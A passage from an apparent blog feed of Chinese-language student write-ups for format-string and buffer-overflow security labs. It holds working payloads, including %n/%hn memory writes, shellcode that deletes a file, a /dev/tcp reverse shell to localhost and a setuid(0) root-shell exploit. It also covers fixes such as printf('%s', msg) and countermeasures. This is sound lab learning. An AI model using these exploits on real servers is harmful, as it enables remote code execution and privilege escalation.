array的地址就是buf的首地址，为0xbffff0e0</p><p> <img src="/2020/10/11/Format-String-lab/task2-3.PNG" srcset="/img/loading.gif" alt="task2-3"></p><p> 之后，要想办法来找到myprintf函数中return address所在的栈地址以及printf（）的格式化字符串所在的地址</p><p> <img src="/2020/10/11/Format-String-lab/task2-2.PNG" srcset="/img/loading.gif" alt="task2-2"></p><p> 可以看到return address的值是0x080487e5</p><p> 之后我们在gdb中用断点来进行调试（注意gdb中的地址并非是真实的栈的地址，因为gdb过程中会向栈中加入一些信息），首先在mian（）中调用printf（）之前设置断点，因为在调用之前都需要先将参数压入栈中</p><p> <img src="/2020/10/11/Format-String-lab/task2-5.PNG" srcset="/img/loading.gif" alt="task2-5"></p><p> 所以其中eax的值就是buf的地址，是0xbfffe770</p><p> 同理，我们也在myprintf（）调用printf打印msg信息之前也设置断点，但是在这里run的话，server program会去等待client的输入，所以我们在client传一个input文件，来让server端来打印栈中的内容</p> <pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"AAAA"</span>+<span class="hljs-string">"%08X."</span>*<span class="hljs-number">40</span>' &gt; inputnc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input</code></pre><p> 有如下显示结果：</p><p> <img src="/2020/10/11/Format-String-lab/task2-6.PNG" srcset="/img/loading.gif" alt="task2-6"></p><p> <img src="/2020/10/11/Format-String-lab/task2-7.PNG" srcset="/img/loading.gif" alt="task2-7"></p><p> 这时候可以看到buffer（圈3）以及return address 的相对偏移量是0xa4，之后在用真正的buffer的虚拟地址减一下就好，是0xbffff03b</p><p> 并且上图中的断点正好是在push之前，此时的esp - 4就是format string的地址，&amp;format string = 0xbfffe630，但是这些并不是真正的虚拟地址，而是在gdb调试中的地址，但是可以用来计算相对位置</p></li><li><p>而此时，圈1和圈3的相对偏移量为0x140 = 320byte，真实的地址分别为（3）0xbffff0e0，（2）0xbffff03b（1）0xbfffefa0</p></li></ol><h3 id="Task3-Crash-the-Program"><a href="#Task3-Crash-the-Program" class="headerlink" title="Task3:  Crash the Program"></a>Task3:  Crash the Program</h3><p>这一步要求我们输入一个message，这个message会使得当myprintf（）尝试执行printf（msg）的时候，程序会发生崩溃，其中一个方法是修改掉myprintf（）的返回地址，这样会发生退出错误，程序崩溃，从上面我们可以知道myprintf（）的返回地址的地址是（2）0xbfffefb8</p><p>构造payload</p><pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"\xb8\xef\xff\xbf%80$n"</span>' &gt; input2nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input2</code></pre><p>%81$n可以认为是program会向前寻找第81个参数已经输出的字节数，即将返回地址会被写入为4，此时发生程序崩溃</p><p><img src="/2020/10/11/Format-String-lab/task4-4.PNG" srcset="/img/loading.gif" alt="task4-4"></p><p><img src="/2020/10/11/Format-String-lab/task4-3.PNG" srcset="/img/loading.gif" alt="task4-3"></p><h3 id="Task-4-Print-Out-the-Server-Program’s-Memory"><a href="#Task-4-Print-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 4: Print Out the Server Program’s Memory"></a>Task 4: Print Out the Server Program’s Memory</h3><h4 id="Task-4-A-Stack-Data"><a href="#Task-4-A-Stack-Data" class="headerlink" title="Task 4.A: Stack Data."></a>Task 4.A: Stack Data.</h4><p>跟上一个task基本一样，只不过是需要print出来，而不是进行修改</p><p>构造payload</p><pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"AAAA%80$8x"</span>' &gt;input3nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input3</code></pre><p><img src="/2020/10/11/Format-String-lab/task4.PNG" srcset="/img/loading.gif" alt="task4"></p><h4 id="Heap-Data"><a href="#Heap-Data" class="headerlink" title="Heap Data"></a>Heap Data</h4><p>直接利用对应的地址进行构造就行</p><pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"\x70\x88\x04\x08%80$s"</span>' &gt; input2nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input2</code></pre><p><img src="/2020/10/11/Format-String-lab/task4-2.PNG" srcset="/img/loading.gif" alt="task4-2">)<img src="/2020/10/11/Format-String-lab/task4-1.PNG" srcset="/img/loading.gif" alt="task4-1"></p><h3 id="Task-5-Change-the-Server-Program’s-Memory"><a href="#Task-5-Change-the-Server-Program’s-Memory" class="headerlink" title="Task 5: Change the Server Program’s Memory"></a>Task 5: Change the Server Program’s Memory</h3><p>在这一个task中，我们需要通过修改payload来对target的值进行修改</p><h4 id="Change-the-value-to-a-different-value"><a href="#Change-the-value-to-a-different-value" class="headerlink" title="Change the value to a different value"></a>Change the value to a different value</h4><p>与task3类似，直接进行构造</p><pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"\x44\xa0\x04\x08%80$n"</span>' &gt; input2nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input2</code></pre><p><img src="/2020/10/11/Format-String-lab/task5-1.PNG" srcset="/img/loading.gif" alt="task5-1"></p><p><img src="/2020/10/11/Format-String-lab/task5.PNG" srcset="/img/loading.gif" alt="task5"></p><h4 id="Change-the-value-to-0x500"><a href="#Change-the-value-to-0x500" class="headerlink" title="Change the value to 0x500"></a>Change the value to 0x500</h4><p>在进行定向修改的时候，需要把位数进行扩充0x500 - 0x4 = 0x4FC = 1276，因为$n是要将此时已经打印出来的字节数写入到对应的变量/地址当中去，在这里采用%1276x来进行1276个字节的填充</p><pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"\x44\xa0\x04\x08%1276x%80$n"</span>' &gt; input2nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input2</code></pre><p><img src="/2020/10/11/Format-String-lab/task5-2.PNG" srcset="/img/loading.gif" alt="task5-2"></p><h4 id="Change-the-value-to-0xFF990000"><a href="#Change-the-value-to-0xFF990000" class="headerlink" title="Change the value to 0xFF990000"></a>Change the value to 0xFF990000</h4><p>当要把内存中的某个地方的值改为一个比较大的数字的时候，如果采用%n写入的话，需要提前输入数量巨大的值，所以，如果我们需要改写的时候，最好的方法是采用%hn，它一次写入两个字节，这增加了他的效率，因为每个字节上的数是已经打印的字节数，比如0x7816，如果是四字节写入的话，那么将需要0x7816个字节来打印，而如果是采用%hn，则需要分别写入0x78和0x16，大大的降低了时间</p><p>而当我们要写入一个特别小的数字的时候，由于前面总会需要我们来提供在内存中的位置，所以中会有一些字节是需要被打印的，这使得我们的%n的范围看起来是有下界的，但是并不是这样，因为我们可以通过溢出来达到我们的目的</p><p>接下来进行构造payload，首先是防止目标的地址（0x0804a044）</p><pre><code class="hljs taggerscript"><span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>08</code></pre><p>这时候我们已经输入了8个字节，第一块空间写的是0x0000，所以采用溢出的方式，需要些0x10000个，剩余填充0x10000 - 0x8 = 65528，之后向第二个空间写入，他需要的是0x1FF99（因为如果是写入0xFF99的话，前面的填充的个数已经超过了，所以只能采取溢出的方式），0x1FF99 - 0x10000 = 0xFF99 = 65433</p><p>所以payload形式如下</p><pre><code class="hljs taggerscript">python -c 'print "<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>08<span class="hljs-variable">%65528x%</span>80<span class="hljs-keyword">$hn%65433x%81$hn"' &gt; input2</span></code></pre><p><img src="/2020/10/11/Format-String-lab/task5-3.PNG" srcset="/img/loading.gif" alt="task5-3"></p><h3 id="Task-6-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-6-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 6: Inject Malicious Code into the Server Program"></a>Task 6: Inject Malicious Code into the Server Program</h3><p>在这里我们需要把shellcode写入内存，同时修改返回地址为shellcode的地址，在这里可以填充nop指令（0x90）这样的话就算是没有跳转到shellcode的起始地址，我们也可以通过nop来到达</p><p>首先，把shellcode的地址设为buffer起始地点 + 0x100，之后把shellcode的高地址和低地址分开运算，这是为了能够用$hn来进行写入，如果低地址小于8（分为2字节来传输的时候，每个地址4字节，至少也要是8字节，这时候只能按照溢出的方法来进行）就用溢出，如果高地址大于低地址，就用高地址减去低地址，之后就进行要分别填充的fill1和fill2，之后就printf就可以了</p><pre><code class="hljs taggerscript">#!/usr/bin/python3import sysshellcode= '<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68bash<span class="hljs-symbol">\x</span>68////<span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68-ccc<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>68    <span class="hljs-symbol">\x</span>68ile <span class="hljs-symbol">\x</span>68/myf<span class="hljs-symbol">\x</span>68/tmp<span class="hljs-symbol">\x</span>68/rm <span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80'nop = '<span class="hljs-symbol">\x</span>90'shellcode_address = 0xbffff0e0 + 0x100high_adr, low_adr = divmod(shellcode_address, 0x10000)fill1 = low_adr - 8 if low_adr &gt; 8 else low_adr + 0x10000 - 8fill2 = high_adr - low_adr if high_adr &gt; low_adr else high_adr + 0x10000 - low_adrprint ('<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>3e<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>bf' + '<span class="hljs-variable">%' + str(fill1) + 'x%</span>80<span class="hljs-keyword">$hn%' + str</span>(fill2) + 'x<span class="hljs-variable">%81$hn' + nop*0x100 +shellcode)</span></code></pre><p>之后运行</p><pre><code class="hljs angelscript">python injection.py &gt; input2nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt; input2</code></pre><p><img src="/2020/10/11/Format-String-lab/task6-1.PNG" srcset="/img/loading.gif" alt="task6-1"></p><p>不建立myfile，则会出现报错</p><p><img src="/2020/10/11/Format-String-lab/task6-2.PNG" srcset="/img/loading.gif" alt="task6-2"></p><h3 id="Task-7-Getting-a-Reverse-Shell"><a href="#Task-7-Getting-a-Reverse-Shell" class="headerlink" title="Task 7: Getting a Reverse Shell"></a>Task 7: Getting a Reverse Shell</h3><p>将shellcode进行修改，其他的地方不用改变</p><pre><code class="hljs taggerscript">#!/usr/bin/python3import sys#shellcode= '<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68bash<span class="hljs-symbol">\x</span>68////<span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68-ccc<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>68    <span class="hljs-symbol">\x</span>68ile <span class="hljs-symbol">\x</span>68/myf<span class="hljs-symbol">\x</span>68/tmp<span class="hljs-symbol">\x</span>68/rm <span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80'shellcode = '<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68bash<span class="hljs-symbol">\x</span>68////<span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68-ccc<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>682&gt;&amp;1<span class="hljs-symbol">\x</span>68&lt;&amp;1 <span class="hljs-symbol">\x</span>6870 0<span class="hljs-symbol">\x</span>681/70<span class="hljs-symbol">\x</span>680.0.<span class="hljs-symbol">\x</span>68127.<span class="hljs-symbol">\x</span>68tcp/<span class="hljs-symbol">\x</span>68dev/<span class="hljs-symbol">\x</span>68 &gt; /<span class="hljs-symbol">\x</span>68h -i<span class="hljs-symbol">\x</span>68/bas<span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80'nop = '<span class="hljs-symbol">\x</span>90'shellcode_address = 0xbffff0e0 + 0x100high_adr, low_adr = divmod(shellcode_address, 0x10000)fill1 = low_adr - 8 if low_adr &gt; 8 else low_adr + 0x10000 - 8fill2 = high_adr - low_adr if high_adr &gt; low_adr else high_adr + 0x10000 - low_adrprint ('<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>3e<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>bf' + '<span class="hljs-variable">%' + str(fill1) + 'x%</span>80<span class="hljs-keyword">$hn%' + str</span>(fill2) + 'x<span class="hljs-variable">%81$hn' + nop*0x100 +shellcode)</span></code></pre><p>这时候进行运行，结果如下</p><p><img src="/2020/10/11/Format-String-lab/task7.PNG" srcset="/img/loading.gif" alt="task7"></p><p><img src="/2020/10/11/Format-String-lab/task7-1.PNG" srcset="/img/loading.gif" alt="task7-1"></p><p><img src="/2020/10/11/Format-String-lab/task7-2.PNG" srcset="/img/loading.gif" alt="task7-2"></p><h3 id="Task-8-Fixing-the-Problem"><a href="#Task-8-Fixing-the-Problem" class="headerlink" title="Task 8: Fixing the Problem"></a>Task 8: Fixing the Problem</h3><p>warning的信息</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">format</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> literal <span class="hljs-keyword">and</span> no <span class="hljs-built_in">format</span> arguments</code></pre><p>是在说不是在格式化参数，解决方案，改为printf（“%s”,msg）即可，此时没有warning</p><p><img src="/2020/10/11/Format-String-lab/task8.PNG" srcset="/img/loading.gif" alt="task8"></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>在这次lab中，涉及到了Format-String 漏洞的利用，主要是format-String要指向buffer的区域，以及说通过构造payload</p><blockquote><p>一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</p></blockquote><p>所以format参数一般就是‘’‘’形式，其中有一个过程是我们通过构造payload AAAA+…以及通过打印出来的栈中的41414141来确定偏移量，这是由于一方面参数是由右到左依次入栈，还因为有一些与格式化字符串无关的函数以及其它内容，比如在我们这task2中，相隔0x80，但是其中却有着例如msg以及返回地址等相关的东西</p><p>过程应该是如下的，在格式化字符串漏洞中，例如printf（str），先将我们构造的str放到一个buffer区域中，之后在调用到printf（）函数的时候，其实真正作为参数传入的，是格式化字符串的指针</p><p>这里还参考了这一篇blog<a href="https://blog.csdn.net/zhengqijun_/article/details/72454714" target="_blank" rel="noopener">printf（）深入解析</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software security lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bufferr_Overflow lab</title>
    <link href="/2020/10/09/Bufferr-Overflow-lab/"/>
    <url>/2020/10/09/Bufferr-Overflow-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Buffer-Overflow-Vulnerability-Lab"><a href="#Buffer-Overflow-Vulnerability-Lab" class="headerlink" title="Buffer Overflow Vulnerability Lab"></a>Buffer Overflow Vulnerability Lab</h1><h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="Turning-Off-Countermeasures"><a href="#Turning-Off-Countermeasures" class="headerlink" title="Turning Off Countermeasures"></a>Turning Off Countermeasures</h3><ol><li><p>Address Space Randomization(堆栈地址随机化)：主要是基于Linux操作系统的机器，通过将heap和stack的起始地址随机化来防止缓存区溢出攻击</p> <pre><code class="hljs routeros">sudo sysctl -w kernel.<span class="hljs-attribute">randomize_va_space</span>=0</code></pre></li><li><p>stackGuard：gcc提供的一种安全机制，当其存在时，无法进行buffer overflow攻击，但是可以在编译文件的时候选择禁用这个安全机制</p></li><li><p>不可执行化堆栈：需要在program头来设置堆栈是否是可执行性的</p></li></ol><h3 id="Task-1-Running-Shellcode"><a href="#Task-1-Running-Shellcode" class="headerlink" title="Task 1: Running Shellcode"></a>Task 1: Running Shellcode</h3><p>shellcode的原型</p><pre><code class="hljs pgsql"><span class="hljs-meta">#include &lt;stdio.h&gt;</span><span class="hljs-type">int</span> main() &#123;<span class="hljs-type">char</span> *<span class="hljs-type">name</span>[<span class="hljs-number">2</span>];<span class="hljs-type">name</span>[<span class="hljs-number">0</span>] = "/bin/sh";<span class="hljs-type">name</span>[<span class="hljs-number">1</span>] = <span class="hljs-keyword">NULL</span>;execve(<span class="hljs-type">name</span>[<span class="hljs-number">0</span>], <span class="hljs-type">name</span>, <span class="hljs-keyword">NULL</span>);&#125;</code></pre><blockquote><p>execve（执行文件）在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序。execve()用来执行第一参数字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。从图中可以，如果通过C语言调用execve来返回shell的话，首先需要引入相应的头文件，然后在主函数中调用系统调用函数execve；同时传入三个参数</p></blockquote><p>这里只是通过C语言来进行调用bin/sh文件并且将对应的参数传入其中，但是我们要将shellcode放入到内存中，这样在进行buffer overflow攻击的时候才能够执行</p><p><img src="/2020/10/09/Bufferr-Overflow-lab/Bufffer-overflow-tsak1.PNG" srcset="/img/loading.gif" alt="Bufffer-overflow-tsak1"></p><p>当我们编译并且运行call_shellcode.c的时候，还会看到出现一个shell，并且在其中输入相应命令可以得到执行后的结果</p><h3 id="Task-2-Exploiting-the-Vulnerability、"><a href="#Task-2-Exploiting-the-Vulnerability、" class="headerlink" title="Task 2: Exploiting the Vulnerability、"></a>Task 2: Exploiting the Vulnerability、</h3><p>分析：在这一步中，关键的是修改buffer里面的内容，它的逻辑是这样的：首先exploit.c先将buffer[517]进行构造，填充好其中的内容，使得在stack.c中调用bof（）来进行strcpy的时候，能够将return address覆盖掉</p><p>增加代码：</p><pre><code class="hljs arduino"><span class="hljs-built_in">strcpy</span>(<span class="hljs-built_in">buffer</span>+<span class="hljs-number">80</span>,shellcode);<span class="hljs-built_in">strcpy</span>(<span class="hljs-built_in">buffer</span> + <span class="hljs-number">0x24</span>, <span class="hljs-string">"\xE7\xEB\xFF\xBF"</span>);</code></pre><p>在这里我们将对应的shellcode放置在buffer + 80(0x50)的地方，这个地方可以随便更改，但是值得注意的是不能覆盖掉return address对应的位置</p><ol><li><p>确定shellcode的存放地址是哪里</p><p> 首先，exploit.c里面的buffer最终是要写入到badfile文件中的，而badfile文件又会被读入到str字符数组中去，所以相应的buffer里面的内容也就相当于是str里面的内容，所以我们先要确定str的地址（gdb调试），之后通过在buffer里面shellcode的偏移地址来确定shellcode在内存中的相应地址</p> <pre><code class="hljs 1c">gdb stackr<span class="hljs-comment">//看寄存器内容</span>p /x <span class="hljs-meta">&amp;str<span class="hljs-comment">//查找str对应的地址</span></span></code></pre><p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-1.PNG" srcset="/img/loading.gif" alt="task2-1"></p><p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-2.PNG" srcset="/img/loading.gif" alt="task2-2"> </p><p> 所以shellcode的代码在stack.c的stack中的位置是0xbfffeb97 + 0x50 = 0xbfffebe7;</p></li><li><p>确定return address的位置</p><p> 当我们确定了shellcode的起始位置之后，我们就需要确定return address的位置，这样让shellcode的起始位置覆盖掉return address就可以了</p><p> 先查看bof的地址以及反汇编内容</p> <pre><code class="hljs ebnf"><span class="hljs-attribute">disas bof</span></code></pre><p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-3.PNG" srcset="/img/loading.gif" alt="task2-3"></p><p> <img src="/2020/10/09/Bufferr-Overflow-lab/stack.gif" srcset="/img/loading.gif" alt="stack"></p><p> 对应分析反汇编代码发现，其中</p> <pre><code class="hljs x86asm"><span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x20</span>]</code></pre><p> 是将buffer入栈，<a href="https://blog.csdn.net/oBuYiSeng/article/details/50183571?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160238962119724848361289%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160238962119724848361289&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-50183571.pc_first_rank_v2_rank_v28&utm_term=lea%E6%B1%87%E7%BC%96%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D&spm=1018.2118.3001.4187" target="_blank" rel="noopener">参考lea与mov的区别</a>，而上面一行的push是将str入栈（变量从右至左入栈）</p><p> 之后查看寄存器</p><p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-4.PNG" srcset="/img/loading.gif" alt="task2-4"></p><p> 所以确定ebp和buffer之间的距离是0x20，同时由于是32位的，所以return address的栈中地址为0x20+0x04 = 0x24</p><p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-5.PNG" srcset="/img/loading.gif" alt="task2-5"></p><p> 成功！！！</p></li></ol><h3 id="Task-3-Defeating-dash’s-Countermeasure"><a href="#Task-3-Defeating-dash’s-Countermeasure" class="headerlink" title="Task 3: Defeating dash’s Countermeasure"></a>Task 3: Defeating dash’s Countermeasure</h3><p>dash是在Ubuntu中的防止栈溢出的策略，会去检测effective UID，下面是mian.c的一些变化</p><p>defeat的策略：在execve（）之前调用setuid（0）</p><ol><li><p>未取消注释的时候：</p><p> <img src="/2020/10/09/Bufferr-Overflow-lab/task3.PNG" srcset="/img/loading.gif" alt="task3"></p><p> 此时获得的是用户权限的shell</p></li><li><p>取消注释：</p><p> <img src="/2020/10/09/Bufferr-Overflow-lab/task3-1.PNG" srcset="/img/loading.gif" alt="task3-1"></p><p> 此时获得的是用户权限的shell</p><p> 更新shellcode</p> <pre><code class="hljs gradle"><span class="hljs-keyword">char</span> shellcode[] =<span class="hljs-string">"\x31\xc0"</span> <span class="hljs-comment">/* Line 1: xorl %eax,%eax */</span><span class="hljs-string">"\x31\xdb"</span> <span class="hljs-comment">/* Line 2: xorl %ebx,%ebx */</span><span class="hljs-string">"\xb0\xd5"</span> <span class="hljs-comment">/* Line 3: movb $0xd5,%al */</span><span class="hljs-string">"\xcd\x80"</span> <span class="hljs-comment">/* Line 4: int $0x80 */</span><span class="hljs-comment">// ---- The code below is the same as the one in Task 2 ---</span><span class="hljs-string">"\x31\xc0"</span><span class="hljs-string">"\x50"</span><span class="hljs-string">"\x68"</span><span class="hljs-string">"//sh"</span><span class="hljs-string">"\x68"</span><span class="hljs-string">"/bin"</span><span class="hljs-string">"\x89\xe3"</span><span class="hljs-string">"\x50"</span><span class="hljs-string">"\x53"</span><span class="hljs-string">"\x89\xe1"</span><span class="hljs-string">"\x99"</span><span class="hljs-string">"\xb0\x0b"</span><span class="hljs-string">"\xcd\x80"</span>;</code></pre><p> 4条指令对应的作用： </p><p> (1) set ebx to zero in Line 2</p><p> (2) set eax to 0xd5 via Line 1 and 3 (0xd5 is setuid()’s system call number)</p><p> (3) execute the system call in Line 4.</p><p> <img src="/2020/10/09/Bufferr-Overflow-lab/task3-2.PNG" srcset="/img/loading.gif" alt="task3-2"></p><p> 此时defeat dash成功，得到root权限的shell</p><p> 并且如果不加入这四行，即不进行setuid（）的话，运行后只能得到用户权限的shell</p><p> <img src="/2020/10/09/Bufferr-Overflow-lab/task3-3.PNG" srcset="/img/loading.gif" alt="task3-3"></p></li></ol><h3 id="Task-4-Defeating-Address-Randomization"><a href="#Task-4-Defeating-Address-Randomization" class="headerlink" title="Task 4: Defeating Address Randomization"></a>Task 4: Defeating Address Randomization</h3><p>打开站地址随机化策略后直接运行</p><p><img src="/2020/10/09/Bufferr-Overflow-lab/task4.PNG" srcset="/img/loading.gif" alt="task4"></p><p>此时会发生segmentation fault，说明在虚拟地址转化为实际的物理地址的时候发生了意外，说明之前计算的地址与现在的是不一样的</p><p>在循环的过程中，如果地址不匹配，一直显示segmentation fault，知道匹配，之后则会发生攻击</p><h3 id="Task-5-Turn-on-the-StackGuard-Protection"><a href="#Task-5-Turn-on-the-StackGuard-Protection" class="headerlink" title="Task 5: Turn on the StackGuard Protection"></a>Task 5: Turn on the StackGuard Protection</h3><p>当打开栈边界保护的时候，重新编译并运行</p><p><img src="/2020/10/09/Bufferr-Overflow-lab/task5.PNG" srcset="/img/loading.gif" alt="task5"></p><p>发现检测到堆栈破坏，运行的易受程序的程序被终止并且放弃</p><p>是由于分配的空间不足以及设置的数值发生了变化，stack.c里面的buffer与要写入的str相比空间太少，所以引起边界保护的报错，同时再修改return address的时候可能会有边界的数值的变化</p><h3 id="Task-6-Turn-on-the-Non-executable-Stack-Protection"><a href="#Task-6-Turn-on-the-Non-executable-Stack-Protection" class="headerlink" title="Task 6: Turn on the Non-executable Stack Protection"></a>Task 6: Turn on the Non-executable Stack Protection</h3><p><img src="/2020/10/09/Bufferr-Overflow-lab/task6.PNG" srcset="/img/loading.gif" alt="task6"></p><p>不能得到一个shell，发生了段错误（segmentation fault），其原因是：我们将对应的shellcode放在了Buffer中，而这一局部变量是位于stack上的，所以对应的逻辑地址无法转化为实际的物理地址，进而更不可能执行，发生segmentation fault</p>]]></content>
    
    
    
    <tags>
      
      <tag>Software security lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web_Security_lab1</title>
    <link href="/2020/10/02/Web-Security-lab1/"/>
    <url>/2020/10/02/Web-Security-lab1/</url>
    
